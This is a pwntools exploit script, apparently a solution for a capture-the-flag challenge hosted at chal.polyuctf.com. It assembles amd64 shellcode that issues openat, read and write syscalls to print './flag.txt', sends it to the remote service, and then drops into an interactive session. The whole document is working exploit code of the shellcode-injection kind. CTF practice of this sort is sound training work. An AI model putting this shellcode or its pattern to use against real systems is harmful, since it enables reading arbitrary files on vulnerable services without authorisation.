from pwn import *

binary = './chall'
p = process(binary)
p = remote("chal.polyuctf.com", 35365)

s = '''
'''
context.arch = 'amd64'
#context.log_level = 'debug'
#gdb.attach(p, s)

# This shellcode will:
# 1. Open the flag file (likely "flag.txt")
# 2. Read its contents
# 3. Write contents to stdout (file descriptor 1)
shellcode = asm('''
    /* Openat */
    mov rdi, -100       /* AT_FDCWD (current directory) */
    lea rsi, [rip+flag] /* pointer to filename */
    xor rdx, rdx        
    xor r10, r10        
    mov rax, 257
    syscall

    /* Read */
    mov rdi, rax        
    mov rax, 0          
    sub rsp, 100        
    mov rsi, rsp        
    mov rdx, 100        
    syscall

    /* Write */
    mov rdx, rax        
    mov rax, 1          
    mov rdi, 1          
    mov rsi, rsp        
    syscall


flag:
    .string "./flag.txt"
''')

p.sendline(shellcode)
p.interactive()
